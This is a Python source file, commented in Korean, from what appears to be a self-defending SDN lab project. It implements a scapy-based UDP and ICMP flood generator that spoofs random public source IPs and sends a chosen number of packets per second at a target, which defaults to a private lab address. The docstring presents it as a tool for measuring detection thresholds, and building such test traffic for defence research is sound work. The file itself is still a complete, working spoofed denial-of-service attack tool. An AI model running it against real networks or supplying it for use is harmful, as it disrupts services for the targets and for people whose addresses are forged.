"""Self-Defending SDN Tower - UDP·ICMP Flood 공격기 (판단 기준 측정용).

traffic_attack.py(SYN Flood)와 같은 방식으로 매초 목표 개수만큼 패킷을 만들어 보낸다. 출발지 IP는
무작위 공인 IP로 변조해서, 서버의 응답이 공격자에게 돌아오지 않는다 (볼륨형 공격).

실행 예: sudo .venv/bin/python -m traffic.traffic_flood --kind udp --pps 1000 --duration 20
"""

from __future__ import annotations

import argparse
import random
import time
from typing import List

from scapy.layers.inet import ICMP, IP, UDP
from scapy.packet import Packet
from scapy.sendrecv import send

try:
    from traffic.checksum_utils import finalize_checksum
    from traffic.traffic_attack import random_public_ip
except ImportError:  # 직접 실행될 때 (패키지 컨텍스트 없음)
    from checksum_utils import finalize_checksum  # type: ignore[no-redef]
    from traffic_attack import random_public_ip  # type: ignore[no-redef]

KINDS = ("udp", "icmp")


def build_packet(kind: str, dst: str) -> Packet:
    # scapy의 Packet.__truediv__는 Self 타입 변수를 속성 할당(__truediv__ = __div__)으로
    # 선언해 mypy가 2단 체이닝에서 타입을 못 풀어낸다(런타임 동작과는 무관한 스텁 한계).
    ip = IP(src=random_public_ip(), dst=dst)
    if kind == "udp":
        payload = UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535))
        pkt = ip / payload / (b"x" * 32)  # type: ignore[operator]
    elif kind == "icmp":
        echo = ICMP(type=8, id=random.randint(0, 65535), seq=random.randint(0, 65535))
        pkt = ip / echo / (b"x" * 32)  # type: ignore[operator]
    else:
        raise ValueError(f"알 수 없는 종류: {kind}")
    return finalize_checksum(pkt)


def run(kind: str, dst: str, pps: int, duration: float) -> dict:
    sent = 0
    seconds = 0
    deadline = time.monotonic() + duration
    while time.monotonic() < deadline:
        tick = time.monotonic()
        packets: List[Packet] = [build_packet(kind, dst) for _ in range(pps)]
        send(packets, verbose=False)
        sent += len(packets)
        seconds += 1
        elapsed = time.monotonic() - tick
        if elapsed < 1.0:
            time.sleep(1.0 - elapsed)
    return {"sent": sent, "seconds": seconds}


def main() -> None:
    p = argparse.ArgumentParser(description="UDP·ICMP Flood 공격기")
    p.add_argument("--kind", choices=KINDS, required=True)
    p.add_argument("--dst", default="10.0.0.4")
    p.add_argument("--pps", type=int, default=1000, help="초당 목표 패킷 수")
    p.add_argument("--duration", type=float, default=20.0)
    a = p.parse_args()
    r = run(a.kind, a.dst, a.pps, a.duration)
    print(f"[traffic_flood] {a.kind}: {r['sent']}건, {r['seconds']}초, 평균 {r['sent'] / max(r['seconds'], 1):.0f} PPS")


if __name__ == "__main__":
    main()
